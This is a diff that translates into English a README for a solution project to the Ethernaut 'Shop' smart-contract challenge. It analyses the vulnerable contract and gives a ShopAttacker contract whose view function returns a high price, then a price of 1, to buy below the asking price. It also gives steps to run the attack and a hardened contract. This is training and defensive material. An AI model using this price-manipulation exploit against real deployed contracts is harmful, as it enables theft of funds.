@@ -1,14 +1,14 @@
-# 🏪 Ethernaut Level 21: Shop 挑戰
+# 🏪 Ethernaut Level 21: Shop Challenge
 
-這是一個針對 [Ethernaut](https://ethernaut.openzeppelin.com/) 第 21 關 "Shop" 的解決方案專案。本挑戰旨在測試您對 Solidity view 函數與狀態變更之間交互作用的理解，以及如何利用這些交互來操控智能合約的行為。
+This is a solution project for the [Ethernaut](https://ethernaut.openzeppelin.com/) Level 21 "Shop" challenge. This challenge aims to test your understanding of the interaction between Solidity view functions and state changes, and how to exploit these interactions to manipulate smart contract behavior.
 
-## 🎯 挑戰目標
+## 🎯 Challenge Objective
 
-以低於商店要求價格購買商品。Shop 合約的商品定價為 100，我們需要想辦法以更低的價格購買。
+Purchase items at a price lower than what the shop requires. The Shop contract prices items at 100, and we need to find a way to buy at a lower price.
 
-## 📋 合約分析
+## 📋 Contract Analysis
 
-### Shop 合約
+### Shop Contract
 
 ```solidity
 contract Shop {
@@ -26,7 +26,7 @@ contract Shop {
 }
 ```
 
-### Buyer 介面
+### Buyer Interface
 
 ```solidity
 interface Buyer {
@@ -34,27 +34,27 @@ interface Buyer {
 }
 ```
 
-## 🔍 漏洞分析
+## 🔍 Vulnerability Analysis
 
-### 關鍵弱點
+### Key Vulnerabilities
 
-1. **介面實作漏洞**: Shop 合約依賴外部合約實作的 `price()` 函數
-2. **雙重調用**: `buy()` 函數會調用 `price()` 兩次：
-   - 第一次：在條件檢查中 (`_buyer.price() >= price`)
-   - 第二次：更新價格時 (`price = _buyer.price()`)
-3. **狀態依賴**: 兩次調用之間，`isSold` 狀態會發生變化
+1. **Interface Implementation Vulnerability**: The Shop contract relies on externally implemented `price()` functions
+2. **Double Call**: The `buy()` function calls `price()` twice:
+   - First time: In condition check (`_buyer.price() >= price`)
+   - Second time: When updating price (`price = _buyer.price()`)
+3. **State Dependency**: Between the two calls, the `isSold` state changes
 
-### 攻擊思路
+### Attack Strategy
 
-由於 `price()` 是 view 函數，不能修改狀態變數。但我們可以：
-- 讀取 Shop 合約的 `isSold` 狀態
-- 根據 `isSold` 的值返回不同的價格
-- 第一次調用時返回高價格 (≥100)
-- 第二次調用時返回低價格 (<100)
+Since `price()` is a view function, it cannot modify state variables. But we can:
+- Read the Shop contract's `isSold` state
+- Return different prices based on the value of `isSold`
+- Return high price (≥100) on first call
+- Return low price (<100) on second call
 
-## 🚀 攻擊實作
+## 🚀 Attack Implementation
 
-### ShopAttacker 合約
+### ShopAttacker Contract
 
 ```solidity
 contract ShopAttacker {
@@ -66,9 +66,9 @@ contract ShopAttacker {
 
     function price() public view returns (uint256) {
         if (shop.isSold() == false) {
-            return 101;  // 第一次調用：通過價格檢查
+            return 101;  // First call: Pass price check
         }
-        return 1;        // 第二次調用：設定低價格
+        return 1;        // Second call: Set low price
     }
 
     function buy() public {
@@ -77,85 +77,85 @@ contract ShopAttacker {
 }
 ```
 
-## 🛠️ 使用說明
+## 🛠️ Usage Instructions
 
-### 環境要求
+### Environment Requirements
 
 - Node.js >= 16
 - Hardhat
 - TypeScript
 
-### 安裝依賴
+### Install Dependencies
 
 ```bash
 npm install
 ```
 
-### 編譯合約
+### Compile Contracts
 
 ```bash
 npx hardhat compile
 ```
 
-### 執行測試
+### Run Tests
 
 ```bash
 npx hardhat test
 ```
 
-### 部署到本地網路
+### Deploy to Local Network
 
 ```bash
-# 啟動本地區塊鏈
+# Start local blockchain
 npx hardhat node
 
-# 部署合約
+# Deploy contracts
 npx hardhat run scripts/deploy.ts --network localhost
 ```
 
-### 在 Ethernaut 平台上使用
+### Using on Ethernaut Platform
 
-1. 開啟瀏覽器開發者工具
-2. 獲取 Shop 合約實例地址：
+1. Open browser developer tools
+2. Get Shop contract instance address:
    ```javascript
    console.log(contract.address)
    ```
-3. 部署 ShopAttacker 合約（使用上述地址作為參數）
-4. 調用 `buy()` 函數執行攻擊
-5. 驗證結果：
+3. Deploy ShopAttacker contract (using the above address as parameter)
+4. Call the `buy()` function to execute the attack
+5. Verify results:
    ```javascript
-   await contract.price() // 應該顯示為 1
+   await contract.price() // Should display as 1
    ```
 
-## 📚 學習要點
+## 📚 Learning Points
 
-### Solidity 安全問題
+### Solidity Security Issues
 
-1. **介面信任問題**: 永遠不要盲目信任外部合約的介面實作
-2. **View 函數安全**: 即使是 view 函數也可能被惡意操控
-3. **狀態檢查時序**: 避免在同一函數中多次調用外部函數進行關鍵決策
+1. **Interface Trust Issues**: Never blindly trust external contract interface implementations
+2. **View Function Security**: Even view functions can be maliciously manipulated
+3. **State Check Timing**: Avoid making critical decisions based on multiple external function calls within the same function
 
-### Gas 限制考量
+### Gas Limit Considerations
 
-本挑戰中 `price()` 函數有 3000 gas 的限制，這限制了我們：
-- 不能修改儲存狀態
-- 不能執行複雜運算
-- 需要使用讀取外部狀態的方式來實現條件邏輯
+In this challenge, the `price()` function has a 3000 gas limit, which restricts us from:
+- Modifying storage state
+- Executing complex computations
+- Needing to use external state reading methods to implement conditional logic
 
-### 防護措施
+### Protection Measures
 
-1. **實作檢查**: 確保所有介面函數都有適當的實作
-2. **單次決策**: 避免基於外部調用的結果做多次決策
-3. **狀態鎖定**: 在關鍵操作期間鎖定狀態變更
-4. **重入保護**: 使用重入保護機制
+1. **Implementation Checks**: Ensure all interface functions have proper implementations
+2. **Single Decision**: Avoid making multiple decisions based on external call results
+3. **State Locking**: Lock state changes during critical operations
+4. **Reentrancy Protection**: Use reentrancy protection mechanisms
 
-## 🔐 改進建議
+## 🔐 Improvement Suggestions
 
 ```solidity
 contract SecureShop {
     uint256 public price = 100;
     bool public isSold;
-    bool private _buying; // 重入保護
+    bool private _buying; // Reentrancy protection
 
     function buy(uint256 maxPrice) public payable {
         require(!_buying, "Reentrant call");
@@ -165,22 +165,22 @@ contract SecureShop {
         
         _buying = true;
         isSold = true;
-        // 處理付款邏輯...
+        // Handle payment logic...
         _buying = false;
     }
 }
 ```
 
-## 📖 相關資源
+## 📖 Related Resources
 
-- [Ethernaut 官方網站](https://ethernaut.openzeppelin.com/)
-- [Solidity 文檔 - View 函數](https://docs.soliditylang.org/en/latest/contracts.html#view-functions)
-- [OpenZeppelin 合約安全指南](https://docs.openzeppelin.com/contracts/)
+- [Ethernaut Official Website](https://ethernaut.openzeppelin.com/)
+- [Solidity Documentation - View Functions](https://docs.soliditylang.org/en/latest/contracts.html#view-functions)
+- [OpenZeppelin Contract Security Guide](https://docs.openzeppelin.com/contracts/)
 
-## 🤝 貢獻
+## 🤝 Contributing
 
-歡迎提交 Pull Request 或開啟 Issue 來改進此專案。
+Feel free to submit Pull Requests or open Issues to improve this project.
 
-## 📄 授權
+## 📄 License
 
-本專案採用 MIT 授權條款。
+This project is licensed under the MIT License.
